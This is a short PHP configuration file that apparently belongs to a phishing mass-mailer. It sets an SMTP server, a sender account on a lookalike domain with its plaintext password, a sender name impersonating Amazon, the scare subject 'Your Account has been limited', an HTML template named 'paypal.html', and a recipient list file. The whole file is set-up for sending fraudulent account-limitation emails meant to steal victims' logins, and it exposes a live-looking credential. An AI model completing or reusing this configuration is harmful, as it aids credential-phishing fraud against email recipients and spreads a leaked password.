<?php

$host =  "smtp.gmail.com";
$port =  587;
$email =  "reply@systemsservice.info";
$pass =  "Langsing1@";
$from =  "reply@systemsservice.info";
$title =  "Amazon, Security Account";
$sub =  "Your Account has been limited";
$letter =  "paypal.html";

$file =  "mail.txt";

  